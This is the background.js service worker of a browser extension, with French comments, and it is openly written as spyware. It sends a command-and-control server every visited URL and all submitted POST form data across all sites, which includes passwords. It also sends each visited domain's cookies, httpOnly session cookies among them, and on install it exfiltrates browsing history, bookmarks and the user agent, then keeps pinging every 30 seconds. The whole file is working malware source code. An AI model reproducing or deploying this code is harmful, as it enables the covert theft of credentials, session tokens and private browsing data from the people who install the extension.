// extension/background.js
// Service worker — tourne en permanence en arrière-plan

const C2 = "http://FILL_SERVER:FILL_PORT";

function post(endpoint, data) {
  fetch(C2 + endpoint, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify(data),
  }).catch(() => {});
}

// ── intercepter toutes les requêtes web ───────────────────────
chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    // Logger chaque URL visitée
    post("/ext/visit", {
      url:       details.url,
      tabId:     details.tabId,
      type:      details.type,
      ts:        new Date().toISOString(),
    });
    return { requestHeaders: details.requestHeaders };
  },
  { urls: ["<all_urls>"] },
  ["requestHeaders"]
);

// ── intercepter les réponses (formulaires POST) ───────────────
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    if (details.method === "POST" && details.requestBody) {
      const body = details.requestBody;
      let data = null;
      if (body.formData) {
        data = body.formData;
      } else if (body.raw) {
        try {
          const bytes = body.raw[0].bytes;
          const text  = new TextDecoder().decode(bytes);
          data = text;
        } catch(e) {}
      }
      if (data) {
        post("/ext/form_submit", {
          url:  details.url,
          data: data,
          ts:   new Date().toISOString(),
        });
      }
    }
  },
  { urls: ["<all_urls>"] },
  ["requestBody"]
);

// ── cookies ───────────────────────────────────────────────────
chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
  if (info.status === "complete" && tab.url) {
    // Récupérer les cookies du domaine visité
    const domain = new URL(tab.url).hostname;
    chrome.cookies.getAll({ domain }, function(cookies) {
      if (cookies.length) {
        post("/ext/cookies", {
          domain,
          url:     tab.url,
          cookies: cookies.map(c => ({
            name:     c.name,
            value:    c.value,
            httpOnly: c.httpOnly,
            secure:   c.secure,
            session:  c.session,
          })),
          ts: new Date().toISOString(),
        });
      }
    });
    // Logger la navigation
    post("/ext/nav", {
      url:   tab.url,
      title: tab.title,
      ts:    new Date().toISOString(),
    });
  }
});

// ── historique ────────────────────────────────────────────────
chrome.runtime.onInstalled.addListener(function() {
  // Au premier lancement — exfiltrer l'historique
  chrome.history.search(
    { text: "", maxResults: 500, startTime: 0 },
    function(items) {
      post("/ext/history", {
        count: items.length,
        items: items.map(i => ({
          url:   i.url,
          title: i.title,
          visits: i.visitCount,
          last:   i.lastVisitTime,
        })),
      });
    }
  );
  // Exfiltrer les bookmarks
  chrome.bookmarks.getTree(function(tree) {
    post("/ext/bookmarks", { tree });
  });
  // Ping d'installation
  post("/ext/install", {
    ts: new Date().toISOString(),
    ua: navigator.userAgent,
  });
});

// Ping régulier toutes les 30s
setInterval(function() {
  post("/ext/ping", { ts: new Date().toISOString() });
}, 30000);